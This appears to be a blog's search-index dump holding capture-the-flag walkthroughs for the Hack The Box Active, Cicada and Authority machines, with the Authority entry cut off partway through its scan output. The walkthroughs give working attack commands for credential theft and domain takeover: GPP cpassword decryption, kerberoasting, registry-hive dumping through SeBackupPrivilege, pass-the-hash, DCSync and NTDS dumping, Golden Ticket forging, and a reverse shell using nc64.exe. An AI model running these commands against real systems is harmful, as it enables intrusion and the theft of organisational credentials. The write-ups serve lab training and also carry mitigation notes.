domainControllerFunctionality: 4 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 4 which means that this server has to be running Windows Server 2008 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note just standard dns entries for a DC. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Nothing of note. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u '' -p '' --shares Null session is valid: We can see we can access the replication Share: netexec smb $box -u 'guest' -p '' --shares Guest account is disabled: Enumerating the Replication share using smbclient: As we can connect using a null session we can use smbclient to enumerate the replication share:\nsmbclient -N \u0026quot;\\\\\\\\$box\\\\Replication\u0026quot; Enumerating the share I find a Groups.xml file in the Polices folder:\nI download it:\nget {31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml Finding hard-coded creds for SVC_TGS user: In the Groups.xml I find hard-coded credentials, albeit hashed in the file. cpassword primer: TL\u0026rsquo;DR: The cpassword attribute in Group Policy Preferences (GPP) stores encrypted passwords for accounts configured through GPP. This can be decrypted using gpp-decrypt (in kali).\nPurpose and Function:\nPurpose: Used in GPP to store passwords for tasks like setting local administrator accounts, mapping network drives, and configuring services. (in this case the SVC_TGS service) Attribute: Appears in the XML files of GPP as cpassword, storing the encrypted password value. Files: Typically found in SYSVOL folder of a domain, making it accessible to any domain user. However as you can see it can be present in any share. Encryption and Format:\nEncryption: AES-256-CBC, but with a +static key+ that was hardcoded by Microsoft. You read that right, MS hardcoded the a static key for this…. Key Problem: The static encryption key is publicly known, which effectively nullifies the security benefits of encryption. We can decrypt it using the tool gpp-decrypt Encoding: The encrypted password is Base64-encoded, making it readable as an alphanumeric string in XML files. Vulnerability and Security Concerns:\nAccess and Exploitability: Since the SYSVOL share is accessible to all authenticated domain users, anyone can read the XML files containing cpassword. Decryption: Due to the static key, tools like gpp-decrypt (or manual decryption using the known key) can easily decrypt the password. Privilege Escalation: Attackers, like us, can leverage cpassword to obtain plaintext passwords, often leading to privilege escalation by compromising local or service accounts with elevated privileges. Microsoft\u0026rsquo;s response to the key disclosure:\nMicrosoft discontinued the use of cpassword in GPP with a patch in 2014 (MS14-025), which removed the ability to set passwords in GPP. The only reason this is present on this machine is that it\u0026rsquo;s running windows server 2008. Microsoft advised using more secure methods like LAPS (Local Administrator Password Solution) for managing local administrator credentials. Mitigation and Detection\nRemoval of Legacy GPPs: Ensure any remaining GPP configurations with cpassword are removed from domain controllers. Access Controls: Limit access to the SYSVOL share, though this is challenging due to default domain-wide access. Use of LAPS: Implementing LAPS or other secure solutions for local password management can prevent similar vulnerabilities. Decrypting the SVC_TGS password using gpp-decrypt: I decrypt the password using gpp-decrypt:\ngpp-decrypt [hash] Checking if the creds are valid:\nnetexec smb $box -u $user -p $pass --shares Looks like we have access to Users share 2. Foothold: Enumerating Users with impacket-lookupsid: As we have valid creds now I like to enumerate all users groups on the domain. We can use impacket-lookupsid to enumerate users on the domain: impacket-lookupsid $domain/$user@$machine.$domain -domain-sids Not many users on the domain. Enumerating the users share as SVC_TGS: I connect as the SVC_TGS user using smbclient:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\Users\u0026quot; Looking at the share it\u0026rsquo;s user home folders:\nI try and access the administrator folder but I am denied:\nChecking our home folder I retrieve the user flag\nI query all users and groups using rpcclient: This does provide any additional information. 3. Privilege Escalation: Extracting the Administrator Hash via Kerberoasting: I try kerberoasting with netexec: netexec ldap $box -u $user -p $pass --kerberoasting kerb.out I get a hit for the administrator: +Note+: It\u0026rsquo;s good practice to try Kerberoasting when we have creds as it can provide an easy win. Cracking the Admin Hash: hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt\nWe crack it:\nI check the cred using netexec \u0026amp; it works:\n4. Ownership: Cracking the Admin Hash to reveal the clear-text password hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt\nWe crack it and :\nI check the cred using netexec \u0026amp; it works:\n5. Persistence: Dumping NTDS.dit/DC-SYNC attack: Perform DC-Sync attack using netexec:\nnetexec smb $box -u $user -p $pass -M ntdsutil Extract all hashes from netexec\ncat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}' Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids S-1-5-21-405608879-3187717380-1996298813 Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer -nthash [KRBTGTHash] -domain-sid [SID] -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Lets get the root flag:\nLessons Learned: What did I learn? Try simple, kerberoast when we have creds can lead to easy wins and privesc paths. What silly mistakes did I make? Had a brainfart in regards to using psexec that was fun. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/active-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/cpassword\/": {
        "title": "Cpassword",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/cpassword\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/cicada-box\/": {
        "title": "Cicada HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","Active Directory","LDAP","RPC","SeBackupPrivilege",],
        "content": "Cicada Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Cicada How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Cicada/scans/nmap 🍣 main 📝 ×110🛤️ ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:35:04 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 09:35 GMT Nmap scan report for 10.129.115.238 Host is up (0.040s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.36 seconds Initial thoughts: Got some classics, DNS, Kerberos, SMB \u0026amp; LDAP. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Cicada/scans/nmap 🍣 main 📝 ×110🛤️ ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:35:12 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-31 09:35 GMT Nmap scan report for 10.129.115.238 Host is up (0.039s latency). Not shown: 65522 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-10-31 16:38:14Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=CICADA-DC.cicada.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:CICADA-DC.cicada.htb | Not valid before: 2024-08-22T20:24:16 |_Not valid after: 2025-08-22T20:24:16 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 53003/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2022 (88%) Aggressive OS guesses: Microsoft Windows Server 2022 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-10-31T16:39:11 |_ start_date: N/A |_clock-skew: 6h59m59s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 242.85 seconds Findings: RPC is enabled it seems. LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is not enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Cicada/scans/ldap 🍣 main 📝 ×110🛤️ ×142 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 09:36:11 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.115.238 with SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=cicada,DC=htb CN=Configuration,DC=cicada,DC=htb CN=Schema,CN=Configuration,DC=cicada,DC=htb DC=DomainDnsZones,DC=cicada,DC=htb DC=ForestDnsZones,DC=cicada,DC=htb We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=cicada,DC=htb ldapServiceName: cicada.htb:cicada-dc$@CICADA.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=CICADA-DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=cicada,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Nothing of note. RPC: I connect using anonymous session:\nrpcclient -U \u0026quot;\u0026quot; $box I connect using rpcclient using a null session:\nrpcclient -U \u0026quot;%\u0026quot; $box I am unable to enumerate either.\nSMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares We can access using the guest account and can see there is an HR share there. netexec smb $box -u '' -p '' --shares No access via null share. Enumerating the HR Share: Connect to the share:\nsmbclient -U 'guest' \u0026quot;\\\\\\\\$box\\\\Public\u0026quot; Find a file:\nDownload file:\nFinding a hard-coded cred in \u0026ldquo;Notice from HR.txt\u0026rdquo;: Reading the file there is a hard-coded password in the file:\nNow we just need a username to enumerate further. I check the exif information of the file incase there is any creator information there:\nexiftool Notice\\ from\\ HR.txt There is none Using impacket-lookupsid: We can use impacket-lookupsid to enumerate users on the domain: impacket-lookupsid $domain/guest@$machine.$domain -domain-sids +Note+: As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password Password Spraying: With the new users list I password spray \u0026amp; get a hit for the user: michael.wrightson +Note+: We know it\u0026rsquo;s Michael\u0026rsquo;s password still as it does not have \u0026ldquo;Guest\u0026rdquo; written besides it. Why does guest appear beside all the names? If you haven\u0026rsquo;t seen this before check out this link. https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon Which says this:\nUsing a random username and password you can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server you\u0026rsquo;re targetting is enabled.\nGuest account in SMB: SMB servers often allow users to connect as a Guest, meaning the users have limited or no write permissions. The server may allow these users to read files but restrict their ability to modify or create new files. In this case authority.htb\\[user]:[Pass](Guest) indicates that the [user] account is authenticated, but with Guest permissions, likely meaning the account does not have full access to resources. So when you see \u0026ldquo;Guest\u0026rdquo; listed after users like authority.htb\\ryan, authority.htb\\tom, etc., it indicates that the user account is being authenticated using the Guest account privileges in SMB. 2. Foothold: Enumerating as michael.wrightson: We can see we have access to more shares: I check the shares but there is nothing of note. Enumerating users using RPC: As we have credentials we can perform credentialed RPC enumeration now.\nI connect using rpcclient:\nrpcclient -U $user $box Let\u0026rsquo;s list the users on the domain so we can get their RID\nenumdomusers Finding a password in the description field via RPC: Enumerating the users I find the user david.orelius has stored their password in clear text in the description field of their account: queryuser 0x454 Enumerating as david.orelius: We can see we have access to the DEV share as david: Finding a backup script in the DEV share. I connect to the DEV share and find the script Backup_script.ps1.\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\DEV\u0026quot; I download the script:\nget Backup_script.ps1 Finding credentials in the backup script: Looking in the script I find credentials for the user emily.oscars: Authenticating as emily.oscars: Authenticating as emily we can see she has access to more shares:\nI login via evil-winrm:\nevil-winrm -i $box -u $user -p $pass I grab the user flag:\n3. Privilege Escalation: Discovering we are part of the backup operators group: Checking emily\u0026rsquo;s group membership we can see she is part of the backup operators group: whoami /groups This means we will have the SebackupUpPrivilege: The SeBackupPrivilege allows us to backup the SAM \u0026amp; System registry hives. Backup Operators \u0026amp; SeBackupPrivilege Primer: Members of the Backup Operators \u0026amp; Server Operators get the theSeBackupPrivilege by default\nThis privilege will allow us to copy a file from a folder, even if there is no access control entry (ACE) for our user on the folder\u0026rsquo;s access control list (ACL) However, we cannot copy using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. This means we can use tools like reg save as it allows registry hives to be exported whilst bypassing ACLs\nKey Information About this privielge:\nAllows a process to read any file, regardless of the file\u0026rsquo;s permissions. Used primarily for backup applications that need access to all files. Bypasses standard file read permissions. Does not enable writing or deleting files, only reading. Typically assigned to backup software or administrative tasks. Security Considerations:\nHigh potential for abuse if granted to unauthorized applications or users. Should be closely monitored and restricted to trusted applications and personnel. 4. Ownership: Dumping Registry Hives \u0026amp; extracting creds using secretsdump: As mentioned previously we can use the reg save command to programatically copy the registry the hives and bypass ACL\u0026rsquo;s. The only reason we can do this is due to us having the SeBackupPrivilege\nI Dump the Hives:\nreg save HKLM\\SYSTEM SYSTEM.SAV reg save HKLM\\SAM SAM.SAV I transfer the hives back to my attack machine:\nExtract the secrets using impacket-secretsdump:\nimpacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL Login as the administrator using their hash:\nevil-winrm -i $box -u $user -H $hash Get our root flag:\n5. Persistence: Dumping NTDS.dit: I dump the ntds.dit using netexec: netexec smb $box -u $user -H $hash -M ntdsutil +Note+: Need to sort out these errors, this is a fresh VM so need to sort these python errors out. Creating a Kerberos Golden Ticket: I upload nc64.exe and mimikatz.exe via evil-winrm session:\nStart a reverse shell back to my attack machine:\nEvil-winrm does not play nice with mimikatz so we need standard reverse-shell. Extract SID \u0026amp; KRBTGT hashes:\nlsadump::dcsync /user:krbtgt /domain:cicada.htb Create ticket:\nkerberos::golden /domain:cicada.local /user:Administrator /sid:S-1-5-21-917908876-1423158569-3159038727 /rc4:[rc4hash] This has a typo (I can see now there is a trailing dash after the SID however it still won\u0026rsquo;t work. Read on) Download the .kirbi\nConvert .kirbi to .ccache:\nimpacket-ticketConverter ticket.kirbi admin.ccache Setup KRB5CCNAME var:\nexport KRB5CCNAME=./admin.ccache Try and connect:\nIt fails this is because I used the rc4 hash instead of the AES hash. So let\u0026rsquo;s generate a new ticket using the aesKey. I create a new ticket using ticketer.py:\npython ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator +Imporant Note+: You do not need the extra-pac parameter the following will work, I was just airing on the side of caution as I had read this issue: https://github.com/fortra/impacket/issues/1457 however the pull request was merged so should be resolved. This command will work (have also tested) python ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator Connect with psexec:\nGolden Ticket Curiosities: When generating a ticket using ticketer.py I can create the ticket and it works fine.\npython3 ../ticketer.py -aesKey [Key] -domain-sid [SID] -domain $domain administrator However when using mimikatz to generate the ticket, I use the exact same key SID etc:\nkerberos::golden /domain:[domain] /user:administrator /sid:[SID] /aes256:[Key] I always get the error [-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked) when trying to use the mimikatz generated one. I have done various testing and unsure as to why.\nLessons Learned: What did I learn? This was mainly about enumeration. Enumerating well and thoroughly. What silly mistakes did I make? Frustratingly trying to determine the mimikatz ticket issue, it\u0026rsquo;s annoying me. So it\u0026rsquo;s not a mistake. Just grinding my gears until I figure it out. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/cicada-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rpc\/": {
        "title": "RPC",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/rpc\/"
    },
    
    "http:\/\/localhost:1313\/tags\/sebackupprivilege\/": {
        "title": "SeBackupPrivilege",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/sebackupprivilege\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/authority-box\/": {
        "title": "Authority HTB Walkthrough",
        "tags": ["Box","HTB","Medium","Windows","LDAP","CA","Certificate","Ansible","RBCD","MachineAccountQuota","PKINIT","RBCD","ESC1",],
        "content": "Authority Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Authority How I use variables \u0026amp; Wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Authority/scans/nmap 🍣 main 3GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 15:05:50 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 15:05 BST Nmap scan report for 10.129.229.56 Host is up (0.11s latency). Not shown: 987 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 8443/tcp open https-alt Nmap done: 1 IP address (1 host up) scanned in 677.96 seconds Initial thoughts: DNS, HTTP, kerberos \u0026amp; LDAP are all interesting. However what is more interesting is the HTTP \u0026amp; 8443 https-alt. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Authority/scans/nmap 🍣 main 4GiB/15GiB | 0B/1GiB with /usr/bin/zsh 🕙 18:30:10 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 18:30 BST Nmap scan report for authority.htb (10.129.229.56) Host is up (0.035s latency). Not shown: 65506 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows ~Kerberos~ (server time: 2024-10-22 21:31:30Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m02s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m03s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m02s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2024-10-22T21:32:46+00:00; +4h00m03s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=ISO-8859-1 | Content-Length: 82 | Date: Tue, 22 Oct 2024 21:31:36 GMT | Connection: close | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;URL=\u0026#39;/pwm\u0026#39;\u0026#34;/\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;/html\u0026gt; | HTTPOptions: | HTTP/1.1 200 | Allow: GET, HEAD, POST, OPTIONS | Content-Length: 0 | Date: Tue, 22 Oct 2024 21:31:36 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 1936 | Date: Tue, 22 Oct 2024 21:31:42 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\\\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\\\u0026lt;/h1\u0026gt;\u0026lt;hr class=\u0026#34;line\u0026#34; 